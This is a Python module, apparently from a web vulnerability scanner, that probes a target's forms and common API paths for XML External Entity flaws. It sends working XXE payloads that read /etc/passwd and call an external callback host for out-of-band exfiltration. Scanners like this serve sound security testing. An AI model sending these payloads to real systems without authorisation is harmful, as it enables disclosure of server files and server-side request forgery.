#!/usr/bin/env python3
"""
XML External Entity (XXE) vulnerability check module.
Checks for XXE vulnerabilities in XML processors.
"""

import requests
import uuid
from bs4 import BeautifulSoup
from core.vulnerabilities import VulnerabilityCheck

class Check(VulnerabilityCheck):
    """XML External Entity (XXE) vulnerability check"""
    
    def __init__(self):
        """Initialize the XXE check"""
        super().__init__()
        self.name = "XXE"
        self.description = "Checks for XML External Entity (XXE) vulnerabilities which can lead to data disclosure, server-side request forgery, or denial of service."
        
        # Generate a unique identifier for this scan
        self.uuid = str(uuid.uuid4())[:8]
        
        # External callback domain to detect blind XXE
        self.callback_domain = f"xxe-{self.uuid}.requestcatcher.com"
        
        # XXE test payloads
        self.payloads = [
            # Basic XXE with external entity
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
                <!ENTITY xxe SYSTEM "http://{self.callback_domain}/xxe-test-basic">
            ]>
            <root>
                <name>&xxe;</name>
            </root>""",
            
            # XXE to read local files
            """<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
                <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <root>
                <name>&xxe;</name>
            </root>""",
            
            # Parameter entity XXE
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
                <!ENTITY % xxe SYSTEM "http://{self.callback_domain}/xxe-test-param">
                %xxe;
            ]>
            <root>
                <name>test</name>
            </root>""",
            
            # Blind XXE with out-of-band exfiltration
            f"""<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
                <!ENTITY % file SYSTEM "file:///etc/passwd">
                <!ENTITY % dtd SYSTEM "http://{self.callback_domain}/evil.dtd">
                %dtd;
            ]>
            <root>
                <name>test</name>
            </root>"""
        ]
        
        # Success patterns indicating XXE vulnerability (for in-band XXE)
        self.success_patterns = [
            "root:", # /etc/passwd
            "daemon:",
            "nobody:",
            "[boot loader]", # boot.ini
            "for 16-bit app support", # boot.ini
            "XML External Entity" # Our own marker
        ]
        
        self.timeout = 10
    
    def run(self, target_url):
        """Run the XXE vulnerability check
        
        Args:
            target_url: URL to check for XXE vulnerabilities
            
        Returns:
            dict: Check results
        """
        result = {
            'vulnerable': False,
            'details': [],
            'description': self.description
        }
        
        # Find XML endpoints by checking for XML processing endpoints
        endpoints = self._find_xml_endpoints(target_url)
        
        # Test each endpoint for XXE
        for endpoint in endpoints:
            self._test_endpoint(endpoint, result)
        
        return result
    
    def _find_xml_endpoints(self, url):
        """Find potential XML processing endpoints
        
        Args:
            url: Target URL
            
        Returns:
            list: Potential XML endpoints
        """
        endpoints = []
        
        try:
            # Get the main page
            response = requests.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for forms that might process XML
            for form in soup.find_all('form'):
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                
                # Make action URL absolute
                if action and not action.startswith(('http://', 'https://')):
                    action = self._make_absolute_url(url, action)
                else:
                    action = url
                
                # Check for indicators that the form might handle XML
                xml_indicators = [
                    'xml' in str(form).lower(),
                    any('content-type' in str(input_tag).lower() and 'xml' in str(input_tag).lower() 
                        for input_tag in form.find_all('input')),
                    any('xml' in input_tag.get('name', '').lower() 
                        for input_tag in form.find_all('input'))
                ]
                
                if any(xml_indicators):
                    endpoints.append({
                        'url': action,
                        'method': method,
                        'form': form
                    })
            
            # Also check for common XML API endpoints
            common_xml_paths = [
                '/api/xml',
                '/xmlrpc.php',
                '/xml',
                '/soap',
                '/api/soap',
                '/ws',
                '/webservice',
                '/api'
            ]
            
            for path in common_xml_paths:
                xml_url = self._make_absolute_url(url, path)
                endpoints.append({
                    'url': xml_url,
                    'method': 'post',
                    'form': None
                })
            
        except (requests.RequestException, UnicodeDecodeError, ConnectionError):
            pass
        
        return endpoints
    
    def _test_endpoint(self, endpoint, result):
        """Test an endpoint for XXE vulnerability
        
        Args:
            endpoint: Endpoint to test (URL and method)
            result: Result dictionary to update
        """
        url = endpoint['url']
        method = endpoint['method']
        
        # Test each payload against the endpoint
        for payload in self.payloads:
            try:
                # Set up XML headers
                headers = {
                    'Content-Type': 'application/xml',
                    'Accept': '*/*'
                }
                
                # Send the request with XXE payload
                if method == 'post':
                    response = requests.post(url, data=payload, headers=headers, timeout=self.timeout)
                else:
                    response = requests.get(url, headers=headers, timeout=self.timeout)
                
                # Check for signs of XXE vulnerability in the response
                if self._check_xxe_response(response):
                    result['vulnerable'] = True
                    result['details'].append({
                        'url': url,
                        'method': method.upper(),
                        'payload': payload[:100] + '...',
                        'type': 'In-band XXE',
                        'evidence': self._extract_evidence(response.text)
                    })
                    return  # Found a vulnerability, no need to test more payloads
                
            except (requests.RequestException, UnicodeDecodeError, ConnectionError):
                continue
    
    def _check_xxe_response(self, response):
        """Check if a response indicates XXE vulnerability
        
        Args:
            response: HTTP response
            
        Returns:
            bool: True if the response indicates XXE vulnerability, False otherwise
        """
        # Check for success patterns in the response
        for pattern in self.success_patterns:
            if pattern in response.text:
                return True
        
        return False
    
    def _extract_evidence(self, response_text):
        """Extract evidence of XXE vulnerability from response text
        
        Args:
            response_text: HTTP response text
            
        Returns:
            str: Evidence of XXE vulnerability
        """
        for pattern in self.success_patterns:
            if pattern in response_text:
                start = max(0, response_text.find(pattern) - 20)
                end = min(len(response_text), response_text.find(pattern) + len(pattern) + 20)
                return response_text[start:end]
        
        return "Response indicates possible XXE vulnerability"
    
    def _make_absolute_url(self, base_url, relative_url):
        """Convert a relative URL to an absolute URL
        
        Args:
            base_url: Base URL
            relative_url: Relative URL to convert
            
        Returns:
            str: Absolute URL
        """
        # Handle relative URLs
        if relative_url.startswith('/'):
            # URL is relative to the domain root
            parts = base_url.split('://', 1)
            if len(parts) > 1:
                proto, rest = parts
                domain = rest.split('/', 1)[0]
                return f"{proto}://{domain}{relative_url}"
            return base_url + relative_url
        elif not relative_url.startswith(('http://', 'https://')):
            # URL is relative to the current path
            if base_url.endswith('/'):
                return base_url + relative_url
            else:
                # Remove the file part if present
                base_path = base_url.rsplit('/', 1)[0]
                return f"{base_path}/{relative_url}"
        else:
            # URL is already absolute
            return relative_url